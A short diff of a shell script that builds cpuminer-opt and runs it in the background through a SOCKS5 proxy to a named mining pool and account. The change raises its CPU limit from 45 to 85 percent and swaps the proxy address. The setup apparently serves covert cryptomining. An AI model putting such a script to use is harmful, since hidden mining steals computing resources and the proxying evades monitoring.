@@ -5,5 +5,5 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://d.jkpool.com:3000 -u doanvantuan90.tuandz02 -p x -x socks5://45.76.4.214:6651 --background
+cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://d.jkpool.com:3000 -u doanvantuan90.tuandz02 -p x -x socks5://207.246.121.224:6651 --background
 
